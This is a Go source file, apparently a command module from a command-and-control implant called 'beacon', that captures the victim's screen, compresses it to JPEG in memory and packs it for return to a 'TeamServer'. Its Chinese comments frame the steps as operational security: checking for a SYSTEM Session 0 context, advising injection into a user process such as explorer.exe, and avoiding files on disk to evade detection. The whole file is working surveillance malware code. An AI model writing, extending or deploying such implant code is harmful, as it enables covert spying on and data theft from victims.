package command

import (
	"beacon/pkg/utils/packet"
	"beacon/pkg/utils/system"
	"bytes"
	"fmt"
	"image/jpeg"
	"time"

	"github.com/kbinani/screenshot"
)

// Screenshot 捕获屏幕截图并将其作为 JPEG 回传给 TeamServer。
func Screenshot(p *packet.Parser) ([]byte, error) {
	// 1. 解析参数
	// MonitorID (0: primary, 1: second...)
	// Quality (1-100)
	argCount := p.ParseInt32()
	if argCount < 2 {
		return nil, fmt.Errorf("screenshot requires MonitorID and Quality arguments")
	}

	monitorID := int(p.ParseInt32())
	quality := int(p.ParseInt32())
	if p.HasError() {
		return nil, p.Error()
	}

	// 2. Session 0 检查 (核心 OpSec)
	// 如果在 Session 0 (SYSTEM 权限的服务会话) 中运行，截图将是黑屏或失败。
	sid, err := system.GetCurrentSessionId()
	if err == nil && sid == 0 {
		return nil, fmt.Errorf("current process is running in Session 0 (SYSTEM). Please inject into a user session (e.g., explorer.exe) before taking a screenshot")
	}

	// 3. 安全性检查：获取当前活动的屏幕数量
	numDisplays := screenshot.NumActiveDisplays()
	if monitorID < 0 || monitorID >= numDisplays {
		return nil, fmt.Errorf("invalid MonitorID: %d. Active displays found: %d", monitorID, numDisplays)
	}

	// 4. 执行内存抓取
	img, err := screenshot.CaptureDisplay(monitorID)
	if err != nil {
		return nil, fmt.Errorf("failed to capture screen: %v", err)
	}

	// 5. 进行内存中的 JPEG 压缩 (规避文件落地检测)
	var buf bytes.Buffer
	encOptions := jpeg.Options{Quality: quality}
	if err := jpeg.Encode(&buf, img, &encOptions); err != nil {
		return nil, fmt.Errorf("failed to encode image: %v", err)
	}

	// 6. 打包回传报文
	// 协议格式：[分辨率字符串, 图片数据长度, 捕获时间, 图片二进制内容]
	resStr := fmt.Sprintf("%dx%d", img.Bounds().Dx(), img.Bounds().Dy())
	imgData := buf.Bytes()
	captureTime := time.Now().Unix()

	return packet.PackArray([]any{
		packet.PackBytes([]byte(resStr)), // 分辨率
		int64(len(imgData)),              // 图片大小
		captureTime,                      // 捕获时间
		packet.PackBytes(imgData),        // 图片数据
	})
}
